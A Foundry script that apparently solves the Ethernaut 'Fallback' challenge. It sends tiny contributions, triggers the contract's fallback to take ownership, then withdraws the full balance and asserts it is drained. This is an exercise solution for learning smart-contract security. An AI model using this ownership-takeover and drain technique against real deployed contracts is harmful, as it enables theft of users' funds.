// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallback} from "../src/01_Fallback.sol";
import {Script, console} from "forge-std/Script.sol";

contract FallbackSolve is Script {
    Fallback instance = Fallback(payable(0xEcaC0eb47b159ec9C135715E8A5b22642bfbCaaB));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Fallback Owner Before#", instance.owner());
        instance.contribute{value: 1 wei}();
        address(instance).call{value: 1 wei}("");
        console.log("Fallback Owner After#", instance.owner());

        instance.withdraw();
        assert(address(instance).balance == 0);

        vm.stopBroadcast();
    }
}
